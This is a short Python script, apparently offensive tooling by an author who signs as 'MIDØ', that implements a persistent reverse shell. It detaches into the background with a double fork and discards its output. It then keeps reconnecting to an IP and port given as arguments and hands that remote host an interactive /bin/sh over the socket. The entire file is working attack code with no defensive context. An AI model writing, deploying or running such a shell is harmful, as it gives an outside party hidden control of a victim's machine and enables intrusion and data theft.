# Coded by MIDØ
# Background mode requres (pip install python-daemon --break-system-packages)
import socket
import subprocess
import os
import time
import sys
import os
import atexit
from signal import SIGTERM

# Check if IP and PORT are provided as arguments
if len(sys.argv) != 3:
    print("Usage: python3 reverse.py <IP> <PORT>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])

# Function to daemonize the process
def daemonize():
    # Fork the process and create a new session
    if os.fork() > 0:
        sys.exit()  # Exit the parent process

    os.setsid()  # Create a new session and detach from terminal
    if os.fork() > 0:
        sys.exit()  # Exit the first child process
    
    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

    atexit.register(lambda: os.remove("/tmp/reverse.pid"))

    with open("/tmp/reverse.pid", "w") as pidfile:
        pidfile.write(str(os.getpid()))  # Store the pid for later management

# Daemonize the script
daemonize()

# Main loop to attempt reverse shell connection
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        break
    except Exception as e:
        print(f"Connection failed: {e}, retrying in 5 seconds...")
        time.sleep(5)
